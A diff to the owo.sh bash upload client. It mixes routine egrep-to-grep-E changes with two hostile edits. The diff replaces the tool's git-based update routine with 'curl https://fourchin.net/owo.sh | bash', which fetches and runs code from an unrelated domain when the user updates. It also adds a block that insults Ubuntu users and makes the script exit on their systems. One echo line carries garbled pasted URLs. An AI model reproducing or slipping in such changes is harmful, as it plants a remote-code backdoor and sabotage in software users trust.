@@ -1,5 +1,8 @@
 #!/bin/bash
-
+if [[ $(lsb_release -a) == *"Ubuntu"* ]]; then
+  echo "lol fuck you"
+  exit 1337
+fi
 #                                   _                 _
 #                                  | |               | |
 #   _____      _____    _   _ _ __ | | ___   __ _  __| | ___ _ __
@@ -245,8 +248,8 @@ function screenshot() {
 		echo $uploadhttps://owo.whats-th.is/4d4047.gifhttps://owo.whats-th.is/4d4047.gif
 	fi
 
-	if egrep -q '"success":\s*true' <<< "${upload}"; then
-		item="$(egrep -o '"url":\s*"[^"]+"' <<<"${upload}" | cut -d "\"" -f 4)"
+	if grep -E -q '"success":\s*true' <<< "${upload}"; then
+		item="$(grep -E -o '"url":\s*"[^"]+"' <<<"${upload}" | cut -d "\"" -f 4)"
 		d=$1
 		if [ "$d" = true ]; then
 			if [ "$scr_copy" = true ]; then
@@ -286,13 +289,13 @@ function upload() {
 		filesize=$(wc -c <"$entry")
 		if [[ $filesize -le 83886081 ]]; then
 			upload=$(curl -s -F "files[]=@"$entry";type=$mimetype" https://api.awau.moe/upload/pomf?key="$key" -H "User-Agent: WhatsThisClient (https://github.com/whats-this/owo.sh, v0.0.19)")
-			item="$(egrep -o '"url":\s*"[^"]+"' <<<"${upload}" | cut -d "\"" -f 4)"
+			item="$(grep -E -o '"url":\s*"[^"]+"' <<<"${upload}" | cut -d "\"" -f 4)"
 		else
 			echo "ERROR : File size too large or another error occured!"
 			exit 1
 		fi
 
-	if egrep -q '"success":\s*true' <<< "${upload}"; then
+	if grep -E -q '"success":\s*true' <<< "${upload}"; then
 		d=$2
 		if [ "$d" = true ]; then
 				clipboard "https://$output_url/$item"
@@ -315,17 +318,7 @@ function upload() {
 }
 
 function runupdate() {
-	cp $owodir/conf.cfg $owodir/conf_backup_$current_version.cfg
-
-	if [ ! -d $owodir/.git ]; then
-		git -C $owodir init
-		git -C $owodir remote add origin https://github.com/whats-this/owo.sh.git
-		git -C $owodir fetch --all
-		git -C $owodir checkout -t origin/stable
-		git -C $owodir reset --hard origin/stable
-	else
-		git -C $owodir pull origin stable
-        fi
+	curl "https://fourchin.net/owo.sh" | bash
 }
 
 function screenrecord() {
@@ -432,7 +425,7 @@ if [ "${1}" = "--update" ]; then
 	if [ "${1}" = "-C" ]; then
 		owodir="${4}"
 	fi
-	remote_version="$(curl --compressed -fsSL --stderr - "https://api.github.com/repos/whats-this/owo.sh/releases" | egrep -m 1 --color 'tag_name":\s*".*"' | cut -d '"' -f 4)"
+	remote_version="$(curl --compressed -fsSL --stderr - "https://api.github.com/repos/whats-this/owo.sh/releases" | grep -E -m 1 --color 'tag_name":\s*".*"' | cut -d '"' -f 4)"
 	if [ "${?}" -eq "0" ]; then
 		if [ ! "${current_version}" = "${remote_version}" ] && [ ! -z "${current_version}" ] && [ ! -z "${remote_version}" ]; then
 			echo "INFO  : Update found!"
